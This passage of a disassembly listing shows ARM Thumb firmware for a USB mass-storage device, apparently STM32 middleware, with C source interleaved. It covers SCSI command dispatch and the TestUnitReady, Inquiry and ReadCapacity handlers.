 8009bc0:	4619      	mov	r1, r3
 8009bc2:	68f8      	ldr	r0, [r7, #12]
 8009bc4:	f000 fb16 	bl	800a1f4 <SCSI_ModeSense6>
 8009bc8:	4603      	mov	r3, r0
 8009bca:	75fb      	strb	r3, [r7, #23]
      break;
 8009bcc:	e05c      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_MODE_SENSE10:
      ret = SCSI_ModeSense10(pdev, lun, cmd);
 8009bce:	7afb      	ldrb	r3, [r7, #11]
 8009bd0:	687a      	ldr	r2, [r7, #4]
 8009bd2:	4619      	mov	r1, r3
 8009bd4:	68f8      	ldr	r0, [r7, #12]
 8009bd6:	f000 fb3d 	bl	800a254 <SCSI_ModeSense10>
 8009bda:	4603      	mov	r3, r0
 8009bdc:	75fb      	strb	r3, [r7, #23]
      break;
 8009bde:	e053      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_FORMAT_CAPACITIES:
      ret = SCSI_ReadFormatCapacity(pdev, lun, cmd);
 8009be0:	7afb      	ldrb	r3, [r7, #11]
 8009be2:	687a      	ldr	r2, [r7, #4]
 8009be4:	4619      	mov	r1, r3
 8009be6:	68f8      	ldr	r0, [r7, #12]
 8009be8:	f000 fa86 	bl	800a0f8 <SCSI_ReadFormatCapacity>
 8009bec:	4603      	mov	r3, r0
 8009bee:	75fb      	strb	r3, [r7, #23]
      break;
 8009bf0:	e04a      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY10:
      ret = SCSI_ReadCapacity10(pdev, lun, cmd);
 8009bf2:	7afb      	ldrb	r3, [r7, #11]
 8009bf4:	687a      	ldr	r2, [r7, #4]
 8009bf6:	4619      	mov	r1, r3
 8009bf8:	68f8      	ldr	r0, [r7, #12]
 8009bfa:	f000 f929 	bl	8009e50 <SCSI_ReadCapacity10>
 8009bfe:	4603      	mov	r3, r0
 8009c00:	75fb      	strb	r3, [r7, #23]
      break;
 8009c02:	e041      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ_CAPACITY16:
      ret = SCSI_ReadCapacity16(pdev, lun, cmd);
 8009c04:	7afb      	ldrb	r3, [r7, #11]
 8009c06:	687a      	ldr	r2, [r7, #4]
 8009c08:	4619      	mov	r1, r3
 8009c0a:	68f8      	ldr	r0, [r7, #12]
 8009c0c:	f000 f9af 	bl	8009f6e <SCSI_ReadCapacity16>
 8009c10:	4603      	mov	r3, r0
 8009c12:	75fb      	strb	r3, [r7, #23]
      break;
 8009c14:	e038      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ10:
      ret = SCSI_Read10(pdev, lun, cmd);
 8009c16:	7afb      	ldrb	r3, [r7, #11]
 8009c18:	687a      	ldr	r2, [r7, #4]
 8009c1a:	4619      	mov	r1, r3
 8009c1c:	68f8      	ldr	r0, [r7, #12]
 8009c1e:	f000 fccd 	bl	800a5bc <SCSI_Read10>
 8009c22:	4603      	mov	r3, r0
 8009c24:	75fb      	strb	r3, [r7, #23]
      break;
 8009c26:	e02f      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_READ12:
      ret = SCSI_Read12(pdev, lun, cmd);
 8009c28:	7afb      	ldrb	r3, [r7, #11]
 8009c2a:	687a      	ldr	r2, [r7, #4]
 8009c2c:	4619      	mov	r1, r3
 8009c2e:	68f8      	ldr	r0, [r7, #12]
 8009c30:	f000 fd7b 	bl	800a72a <SCSI_Read12>
 8009c34:	4603      	mov	r3, r0
 8009c36:	75fb      	strb	r3, [r7, #23]
      break;
 8009c38:	e026      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE10:
      ret = SCSI_Write10(pdev, lun, cmd);
 8009c3a:	7afb      	ldrb	r3, [r7, #11]
 8009c3c:	687a      	ldr	r2, [r7, #4]
 8009c3e:	4619      	mov	r1, r3
 8009c40:	68f8      	ldr	r0, [r7, #12]
 8009c42:	f000 fe33 	bl	800a8ac <SCSI_Write10>
 8009c46:	4603      	mov	r3, r0
 8009c48:	75fb      	strb	r3, [r7, #23]
      break;
 8009c4a:	e01d      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_WRITE12:
      ret = SCSI_Write12(pdev, lun, cmd);
 8009c4c:	7afb      	ldrb	r3, [r7, #11]
 8009c4e:	687a      	ldr	r2, [r7, #4]
 8009c50:	4619      	mov	r1, r3
 8009c52:	68f8      	ldr	r0, [r7, #12]
 8009c54:	f000 ff0e 	bl	800aa74 <SCSI_Write12>
 8009c58:	4603      	mov	r3, r0
 8009c5a:	75fb      	strb	r3, [r7, #23]
      break;
 8009c5c:	e014      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    case SCSI_VERIFY10:
      ret = SCSI_Verify10(pdev, lun, cmd);
 8009c5e:	7afb      	ldrb	r3, [r7, #11]
 8009c60:	687a      	ldr	r2, [r7, #4]
 8009c62:	4619      	mov	r1, r3
 8009c64:	68f8      	ldr	r0, [r7, #12]
 8009c66:	f000 fff9 	bl	800ac5c <SCSI_Verify10>
 8009c6a:	4603      	mov	r3, r0
 8009c6c:	75fb      	strb	r3, [r7, #23]
      break;
 8009c6e:	e00b      	b.n	8009c88 <SCSI_ProcessCmd+0x2f8>

    default:
      SCSI_SenseCode(pdev, lun, ILLEGAL_REQUEST, INVALID_CDB);
 8009c70:	7af9      	ldrb	r1, [r7, #11]
 8009c72:	2320      	movs	r3, #32
 8009c74:	2205      	movs	r2, #5
 8009c76:	68f8      	ldr	r0, [r7, #12]
 8009c78:	f000 fbb6 	bl	800a3e8 <SCSI_SenseCode>
      hmsc->bot_status = USBD_BOT_STATUS_ERROR;
 8009c7c:	693b      	ldr	r3, [r7, #16]
 8009c7e:	2202      	movs	r2, #2
 8009c80:	725a      	strb	r2, [r3, #9]
      ret = -1;
 8009c82:	23ff      	movs	r3, #255	; 0xff
 8009c84:	75fb      	strb	r3, [r7, #23]
      break;
 8009c86:	bf00      	nop
  }

  return ret;
 8009c88:	f997 3017 	ldrsb.w	r3, [r7, #23]
}
 8009c8c:	4618      	mov	r0, r3
 8009c8e:	3718      	adds	r7, #24
 8009c90:	46bd      	mov	sp, r7
 8009c92:	bd80      	pop	{r7, pc}

08009c94 <SCSI_TestUnitReady>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_TestUnitReady(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009c94:	b580      	push	{r7, lr}
 8009c96:	b086      	sub	sp, #24
 8009c98:	af00      	add	r7, sp, #0
 8009c9a:	60f8      	str	r0, [r7, #12]
 8009c9c:	460b      	mov	r3, r1
 8009c9e:	607a      	str	r2, [r7, #4]
 8009ca0:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009ca2:	68fb      	ldr	r3, [r7, #12]
 8009ca4:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009ca8:	68fb      	ldr	r3, [r7, #12]
 8009caa:	32b0      	adds	r2, #176	; 0xb0
 8009cac:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009cb0:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009cb2:	697b      	ldr	r3, [r7, #20]
 8009cb4:	2b00      	cmp	r3, #0
 8009cb6:	d102      	bne.n	8009cbe <SCSI_TestUnitReady+0x2a>
  {
    return -1;
 8009cb8:	f04f 33ff 	mov.w	r3, #4294967295
 8009cbc:	e043      	b.n	8009d46 <SCSI_TestUnitReady+0xb2>
  }

  /* case 9 : Hi > D0 */
  if (hmsc->cbw.dDataLength != 0U)
 8009cbe:	697b      	ldr	r3, [r7, #20]
 8009cc0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cc4:	699b      	ldr	r3, [r3, #24]
 8009cc6:	2b00      	cmp	r3, #0
 8009cc8:	d00b      	beq.n	8009ce2 <SCSI_TestUnitReady+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009cca:	697b      	ldr	r3, [r7, #20]
 8009ccc:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009cd0:	7f59      	ldrb	r1, [r3, #29]
 8009cd2:	2320      	movs	r3, #32
 8009cd4:	2205      	movs	r2, #5
 8009cd6:	68f8      	ldr	r0, [r7, #12]
 8009cd8:	f000 fb86 	bl	800a3e8 <SCSI_SenseCode>

    return -1;
 8009cdc:	f04f 33ff 	mov.w	r3, #4294967295
 8009ce0:	e031      	b.n	8009d46 <SCSI_TestUnitReady+0xb2>
  }

  if (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED)
 8009ce2:	697b      	ldr	r3, [r7, #20]
 8009ce4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ce8:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009cec:	2b02      	cmp	r3, #2
 8009cee:	d10b      	bne.n	8009d08 <SCSI_TestUnitReady+0x74>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009cf0:	7af9      	ldrb	r1, [r7, #11]
 8009cf2:	233a      	movs	r3, #58	; 0x3a
 8009cf4:	2202      	movs	r2, #2
 8009cf6:	68f8      	ldr	r0, [r7, #12]
 8009cf8:	f000 fb76 	bl	800a3e8 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009cfc:	697b      	ldr	r3, [r7, #20]
 8009cfe:	2205      	movs	r2, #5
 8009d00:	721a      	strb	r2, [r3, #8]
    return -1;
 8009d02:	f04f 33ff 	mov.w	r3, #4294967295
 8009d06:	e01e      	b.n	8009d46 <SCSI_TestUnitReady+0xb2>
  }

  if (((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->IsReady(lun) != 0)
 8009d08:	68fb      	ldr	r3, [r7, #12]
 8009d0a:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009d0e:	68fa      	ldr	r2, [r7, #12]
 8009d10:	33b0      	adds	r3, #176	; 0xb0
 8009d12:	009b      	lsls	r3, r3, #2
 8009d14:	4413      	add	r3, r2
 8009d16:	685b      	ldr	r3, [r3, #4]
 8009d18:	689b      	ldr	r3, [r3, #8]
 8009d1a:	7afa      	ldrb	r2, [r7, #11]
 8009d1c:	4610      	mov	r0, r2
 8009d1e:	4798      	blx	r3
 8009d20:	4603      	mov	r3, r0
 8009d22:	2b00      	cmp	r3, #0
 8009d24:	d00b      	beq.n	8009d3e <SCSI_TestUnitReady+0xaa>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009d26:	7af9      	ldrb	r1, [r7, #11]
 8009d28:	233a      	movs	r3, #58	; 0x3a
 8009d2a:	2202      	movs	r2, #2
 8009d2c:	68f8      	ldr	r0, [r7, #12]
 8009d2e:	f000 fb5b 	bl	800a3e8 <SCSI_SenseCode>
    hmsc->bot_state = USBD_BOT_NO_DATA;
 8009d32:	697b      	ldr	r3, [r7, #20]
 8009d34:	2205      	movs	r2, #5
 8009d36:	721a      	strb	r2, [r3, #8]

    return -1;
 8009d38:	f04f 33ff 	mov.w	r3, #4294967295
 8009d3c:	e003      	b.n	8009d46 <SCSI_TestUnitReady+0xb2>
  }
  hmsc->bot_data_length = 0U;
 8009d3e:	697b      	ldr	r3, [r7, #20]
 8009d40:	2200      	movs	r2, #0
 8009d42:	60da      	str	r2, [r3, #12]

  return 0;
 8009d44:	2300      	movs	r3, #0
}
 8009d46:	4618      	mov	r0, r3
 8009d48:	3718      	adds	r7, #24
 8009d4a:	46bd      	mov	sp, r7
 8009d4c:	bd80      	pop	{r7, pc}
	...

08009d50 <SCSI_Inquiry>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_Inquiry(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009d50:	b580      	push	{r7, lr}
 8009d52:	b088      	sub	sp, #32
 8009d54:	af00      	add	r7, sp, #0
 8009d56:	60f8      	str	r0, [r7, #12]
 8009d58:	460b      	mov	r3, r1
 8009d5a:	607a      	str	r2, [r7, #4]
 8009d5c:	72fb      	strb	r3, [r7, #11]
  uint8_t *pPage;
  uint16_t len;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009d5e:	68fb      	ldr	r3, [r7, #12]
 8009d60:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009d64:	68fb      	ldr	r3, [r7, #12]
 8009d66:	32b0      	adds	r2, #176	; 0xb0
 8009d68:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009d6c:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009d6e:	69bb      	ldr	r3, [r7, #24]
 8009d70:	2b00      	cmp	r3, #0
 8009d72:	d102      	bne.n	8009d7a <SCSI_Inquiry+0x2a>
  {
    return -1;
 8009d74:	f04f 33ff 	mov.w	r3, #4294967295
 8009d78:	e062      	b.n	8009e40 <SCSI_Inquiry+0xf0>
  }

  if (hmsc->cbw.dDataLength == 0U)
 8009d7a:	69bb      	ldr	r3, [r7, #24]
 8009d7c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d80:	699b      	ldr	r3, [r3, #24]
 8009d82:	2b00      	cmp	r3, #0
 8009d84:	d10b      	bne.n	8009d9e <SCSI_Inquiry+0x4e>
  {
    SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST, INVALID_CDB);
 8009d86:	69bb      	ldr	r3, [r7, #24]
 8009d88:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009d8c:	7f59      	ldrb	r1, [r3, #29]
 8009d8e:	2320      	movs	r3, #32
 8009d90:	2205      	movs	r2, #5
 8009d92:	68f8      	ldr	r0, [r7, #12]
 8009d94:	f000 fb28 	bl	800a3e8 <SCSI_SenseCode>
    return -1;
 8009d98:	f04f 33ff 	mov.w	r3, #4294967295
 8009d9c:	e050      	b.n	8009e40 <SCSI_Inquiry+0xf0>
  }

  if ((params[1] & 0x01U) != 0U) /* Evpd is set */
 8009d9e:	687b      	ldr	r3, [r7, #4]
 8009da0:	3301      	adds	r3, #1
 8009da2:	781b      	ldrb	r3, [r3, #0]
 8009da4:	f003 0301 	and.w	r3, r3, #1
 8009da8:	2b00      	cmp	r3, #0
 8009daa:	d021      	beq.n	8009df0 <SCSI_Inquiry+0xa0>
  {
    if (params[2] == 0U) /* Request for Supported Vital Product Data Pages*/
 8009dac:	687b      	ldr	r3, [r7, #4]
 8009dae:	3302      	adds	r3, #2
 8009db0:	781b      	ldrb	r3, [r3, #0]
 8009db2:	2b00      	cmp	r3, #0
 8009db4:	d105      	bne.n	8009dc2 <SCSI_Inquiry+0x72>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page00_Inquiry_Data, LENGTH_INQUIRY_PAGE00);
 8009db6:	2206      	movs	r2, #6
 8009db8:	4923      	ldr	r1, [pc, #140]	; (8009e48 <SCSI_Inquiry+0xf8>)
 8009dba:	69b8      	ldr	r0, [r7, #24]
 8009dbc:	f001 f8fa 	bl	800afb4 <SCSI_UpdateBotData>
 8009dc0:	e03d      	b.n	8009e3e <SCSI_Inquiry+0xee>
    }
    else if (params[2] == 0x80U) /* Request for VPD page 0x80 Unit Serial Number */
 8009dc2:	687b      	ldr	r3, [r7, #4]
 8009dc4:	3302      	adds	r3, #2
 8009dc6:	781b      	ldrb	r3, [r3, #0]
 8009dc8:	2b80      	cmp	r3, #128	; 0x80
 8009dca:	d105      	bne.n	8009dd8 <SCSI_Inquiry+0x88>
    {
      (void)SCSI_UpdateBotData(hmsc, MSC_Page80_Inquiry_Data, LENGTH_INQUIRY_PAGE80);
 8009dcc:	2208      	movs	r2, #8
 8009dce:	491f      	ldr	r1, [pc, #124]	; (8009e4c <SCSI_Inquiry+0xfc>)
 8009dd0:	69b8      	ldr	r0, [r7, #24]
 8009dd2:	f001 f8ef 	bl	800afb4 <SCSI_UpdateBotData>
 8009dd6:	e032      	b.n	8009e3e <SCSI_Inquiry+0xee>
    }
    else /* Request Not supported */
    {
      SCSI_SenseCode(pdev, hmsc->cbw.bLUN, ILLEGAL_REQUEST,
 8009dd8:	69bb      	ldr	r3, [r7, #24]
 8009dda:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009dde:	7f59      	ldrb	r1, [r3, #29]
 8009de0:	2324      	movs	r3, #36	; 0x24
 8009de2:	2205      	movs	r2, #5
 8009de4:	68f8      	ldr	r0, [r7, #12]
 8009de6:	f000 faff 	bl	800a3e8 <SCSI_SenseCode>
                     INVALID_FIELED_IN_COMMAND);

      return -1;
 8009dea:	f04f 33ff 	mov.w	r3, #4294967295
 8009dee:	e027      	b.n	8009e40 <SCSI_Inquiry+0xf0>
    }
  }
  else
  {

    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009df0:	68fb      	ldr	r3, [r7, #12]
 8009df2:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009df6:	68fa      	ldr	r2, [r7, #12]
 8009df8:	33b0      	adds	r3, #176	; 0xb0
 8009dfa:	009b      	lsls	r3, r3, #2
 8009dfc:	4413      	add	r3, r2
 8009dfe:	685b      	ldr	r3, [r3, #4]
            ->pInquiry[lun * STANDARD_INQUIRY_DATA_LEN];
 8009e00:	69d9      	ldr	r1, [r3, #28]
 8009e02:	7afa      	ldrb	r2, [r7, #11]
 8009e04:	4613      	mov	r3, r2
 8009e06:	00db      	lsls	r3, r3, #3
 8009e08:	4413      	add	r3, r2
 8009e0a:	009b      	lsls	r3, r3, #2
    pPage = (uint8_t *) & ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId]) \
 8009e0c:	440b      	add	r3, r1
 8009e0e:	617b      	str	r3, [r7, #20]
    len = (uint16_t)pPage[4] + 5U;
 8009e10:	697b      	ldr	r3, [r7, #20]
 8009e12:	3304      	adds	r3, #4
 8009e14:	781b      	ldrb	r3, [r3, #0]
 8009e16:	b29b      	uxth	r3, r3
 8009e18:	3305      	adds	r3, #5
 8009e1a:	83fb      	strh	r3, [r7, #30]

    if (params[4] <= len)
 8009e1c:	687b      	ldr	r3, [r7, #4]
 8009e1e:	3304      	adds	r3, #4
 8009e20:	781b      	ldrb	r3, [r3, #0]
 8009e22:	b29b      	uxth	r3, r3
 8009e24:	8bfa      	ldrh	r2, [r7, #30]
 8009e26:	429a      	cmp	r2, r3
 8009e28:	d303      	bcc.n	8009e32 <SCSI_Inquiry+0xe2>
    {
      len = params[4];
 8009e2a:	687b      	ldr	r3, [r7, #4]
 8009e2c:	3304      	adds	r3, #4
 8009e2e:	781b      	ldrb	r3, [r3, #0]
 8009e30:	83fb      	strh	r3, [r7, #30]
    }

    (void)SCSI_UpdateBotData(hmsc, pPage, len);
 8009e32:	8bfb      	ldrh	r3, [r7, #30]
 8009e34:	461a      	mov	r2, r3
 8009e36:	6979      	ldr	r1, [r7, #20]
 8009e38:	69b8      	ldr	r0, [r7, #24]
 8009e3a:	f001 f8bb 	bl	800afb4 <SCSI_UpdateBotData>
  }

  return 0;
 8009e3e:	2300      	movs	r3, #0
}
 8009e40:	4618      	mov	r0, r3
 8009e42:	3720      	adds	r7, #32
 8009e44:	46bd      	mov	sp, r7
 8009e46:	bd80      	pop	{r7, pc}
 8009e48:	2000010c 	.word	0x2000010c
 8009e4c:	20000114 	.word	0x20000114

08009e50 <SCSI_ReadCapacity10>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity10(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009e50:	b590      	push	{r4, r7, lr}
 8009e52:	b087      	sub	sp, #28
 8009e54:	af00      	add	r7, sp, #0
 8009e56:	60f8      	str	r0, [r7, #12]
 8009e58:	460b      	mov	r3, r1
 8009e5a:	607a      	str	r2, [r7, #4]
 8009e5c:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009e5e:	68fb      	ldr	r3, [r7, #12]
 8009e60:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009e64:	68fb      	ldr	r3, [r7, #12]
 8009e66:	32b0      	adds	r2, #176	; 0xb0
 8009e68:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009e6c:	617b      	str	r3, [r7, #20]

  if (hmsc == NULL)
 8009e6e:	697b      	ldr	r3, [r7, #20]
 8009e70:	2b00      	cmp	r3, #0
 8009e72:	d102      	bne.n	8009e7a <SCSI_ReadCapacity10+0x2a>
  {
    return -1;
 8009e74:	f04f 33ff 	mov.w	r3, #4294967295
 8009e78:	e075      	b.n	8009f66 <SCSI_ReadCapacity10+0x116>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009e7a:	68fb      	ldr	r3, [r7, #12]
 8009e7c:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009e80:	68fa      	ldr	r2, [r7, #12]
 8009e82:	33b0      	adds	r3, #176	; 0xb0
 8009e84:	009b      	lsls	r3, r3, #2
 8009e86:	4413      	add	r3, r2
 8009e88:	685b      	ldr	r3, [r3, #4]
 8009e8a:	685c      	ldr	r4, [r3, #4]
 8009e8c:	697b      	ldr	r3, [r7, #20]
 8009e8e:	f503 5383 	add.w	r3, r3, #4192	; 0x1060
 8009e92:	3308      	adds	r3, #8
 8009e94:	697a      	ldr	r2, [r7, #20]
 8009e96:	f502 5283 	add.w	r2, r2, #4192	; 0x1060
 8009e9a:	3204      	adds	r2, #4
 8009e9c:	7af8      	ldrb	r0, [r7, #11]
 8009e9e:	4619      	mov	r1, r3
 8009ea0:	47a0      	blx	r4
 8009ea2:	4603      	mov	r3, r0
 8009ea4:	74fb      	strb	r3, [r7, #19]
                                                                             &hmsc->scsi_blk_size);

  if ((ret != 0) || (hmsc->scsi_medium_state == SCSI_MEDIUM_EJECTED))
 8009ea6:	f997 3013 	ldrsb.w	r3, [r7, #19]
 8009eaa:	2b00      	cmp	r3, #0
 8009eac:	d106      	bne.n	8009ebc <SCSI_ReadCapacity10+0x6c>
 8009eae:	697b      	ldr	r3, [r7, #20]
 8009eb0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009eb4:	f893 3062 	ldrb.w	r3, [r3, #98]	; 0x62
 8009eb8:	2b02      	cmp	r3, #2
 8009eba:	d108      	bne.n	8009ece <SCSI_ReadCapacity10+0x7e>
  {
    SCSI_SenseCode(pdev, lun, NOT_READY, MEDIUM_NOT_PRESENT);
 8009ebc:	7af9      	ldrb	r1, [r7, #11]
 8009ebe:	233a      	movs	r3, #58	; 0x3a
 8009ec0:	2202      	movs	r2, #2
 8009ec2:	68f8      	ldr	r0, [r7, #12]
 8009ec4:	f000 fa90 	bl	800a3e8 <SCSI_SenseCode>
    return -1;
 8009ec8:	f04f 33ff 	mov.w	r3, #4294967295
 8009ecc:	e04b      	b.n	8009f66 <SCSI_ReadCapacity10+0x116>
  }

  hmsc->bot_data[0] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 24);
 8009ece:	697b      	ldr	r3, [r7, #20]
 8009ed0:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ed4:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009ed6:	3b01      	subs	r3, #1
 8009ed8:	0e1b      	lsrs	r3, r3, #24
 8009eda:	b2da      	uxtb	r2, r3
 8009edc:	697b      	ldr	r3, [r7, #20]
 8009ede:	741a      	strb	r2, [r3, #16]
  hmsc->bot_data[1] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >> 16);
 8009ee0:	697b      	ldr	r3, [r7, #20]
 8009ee2:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ee6:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009ee8:	3b01      	subs	r3, #1
 8009eea:	0c1b      	lsrs	r3, r3, #16
 8009eec:	b2da      	uxtb	r2, r3
 8009eee:	697b      	ldr	r3, [r7, #20]
 8009ef0:	745a      	strb	r2, [r3, #17]
  hmsc->bot_data[2] = (uint8_t)((hmsc->scsi_blk_nbr - 1U) >>  8);
 8009ef2:	697b      	ldr	r3, [r7, #20]
 8009ef4:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009ef8:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009efa:	3b01      	subs	r3, #1
 8009efc:	0a1b      	lsrs	r3, r3, #8
 8009efe:	b2da      	uxtb	r2, r3
 8009f00:	697b      	ldr	r3, [r7, #20]
 8009f02:	749a      	strb	r2, [r3, #18]
  hmsc->bot_data[3] = (uint8_t)(hmsc->scsi_blk_nbr - 1U);
 8009f04:	697b      	ldr	r3, [r7, #20]
 8009f06:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f0a:	6e9b      	ldr	r3, [r3, #104]	; 0x68
 8009f0c:	b2db      	uxtb	r3, r3
 8009f0e:	3b01      	subs	r3, #1
 8009f10:	b2da      	uxtb	r2, r3
 8009f12:	697b      	ldr	r3, [r7, #20]
 8009f14:	74da      	strb	r2, [r3, #19]

  hmsc->bot_data[4] = (uint8_t)(hmsc->scsi_blk_size >>  24);
 8009f16:	697b      	ldr	r3, [r7, #20]
 8009f18:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f1c:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f20:	161b      	asrs	r3, r3, #24
 8009f22:	b2da      	uxtb	r2, r3
 8009f24:	697b      	ldr	r3, [r7, #20]
 8009f26:	751a      	strb	r2, [r3, #20]
  hmsc->bot_data[5] = (uint8_t)(hmsc->scsi_blk_size >>  16);
 8009f28:	697b      	ldr	r3, [r7, #20]
 8009f2a:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f2e:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f32:	141b      	asrs	r3, r3, #16
 8009f34:	b2da      	uxtb	r2, r3
 8009f36:	697b      	ldr	r3, [r7, #20]
 8009f38:	755a      	strb	r2, [r3, #21]
  hmsc->bot_data[6] = (uint8_t)(hmsc->scsi_blk_size >>  8);
 8009f3a:	697b      	ldr	r3, [r7, #20]
 8009f3c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f40:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f44:	0a1b      	lsrs	r3, r3, #8
 8009f46:	b29b      	uxth	r3, r3
 8009f48:	b2da      	uxtb	r2, r3
 8009f4a:	697b      	ldr	r3, [r7, #20]
 8009f4c:	759a      	strb	r2, [r3, #22]
  hmsc->bot_data[7] = (uint8_t)(hmsc->scsi_blk_size);
 8009f4e:	697b      	ldr	r3, [r7, #20]
 8009f50:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009f54:	f8b3 3064 	ldrh.w	r3, [r3, #100]	; 0x64
 8009f58:	b2da      	uxtb	r2, r3
 8009f5a:	697b      	ldr	r3, [r7, #20]
 8009f5c:	75da      	strb	r2, [r3, #23]

  hmsc->bot_data_length = 8U;
 8009f5e:	697b      	ldr	r3, [r7, #20]
 8009f60:	2208      	movs	r2, #8
 8009f62:	60da      	str	r2, [r3, #12]

  return 0;
 8009f64:	2300      	movs	r3, #0

}
 8009f66:	4618      	mov	r0, r3
 8009f68:	371c      	adds	r7, #28
 8009f6a:	46bd      	mov	sp, r7
 8009f6c:	bd90      	pop	{r4, r7, pc}

08009f6e <SCSI_ReadCapacity16>:
  * @param  lun: Logical unit number
  * @param  params: Command parameters
  * @retval status
  */
static int8_t SCSI_ReadCapacity16(USBD_HandleTypeDef *pdev, uint8_t lun, uint8_t *params)
{
 8009f6e:	b590      	push	{r4, r7, lr}
 8009f70:	b089      	sub	sp, #36	; 0x24
 8009f72:	af00      	add	r7, sp, #0
 8009f74:	60f8      	str	r0, [r7, #12]
 8009f76:	460b      	mov	r3, r1
 8009f78:	607a      	str	r2, [r7, #4]
 8009f7a:	72fb      	strb	r3, [r7, #11]
  UNUSED(params);
  uint32_t idx;
  int8_t ret;
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 8009f7c:	68fb      	ldr	r3, [r7, #12]
 8009f7e:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 8009f82:	68fb      	ldr	r3, [r7, #12]
 8009f84:	32b0      	adds	r2, #176	; 0xb0
 8009f86:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 8009f8a:	61bb      	str	r3, [r7, #24]

  if (hmsc == NULL)
 8009f8c:	69bb      	ldr	r3, [r7, #24]
 8009f8e:	2b00      	cmp	r3, #0
 8009f90:	d102      	bne.n	8009f98 <SCSI_ReadCapacity16+0x2a>
  {
    return -1;
 8009f92:	f04f 33ff 	mov.w	r3, #4294967295
 8009f96:	e0ab      	b.n	800a0f0 <SCSI_ReadCapacity16+0x182>
  }

  ret = ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetCapacity(lun, &hmsc->scsi_blk_nbr,
 8009f98:	68fb      	ldr	r3, [r7, #12]
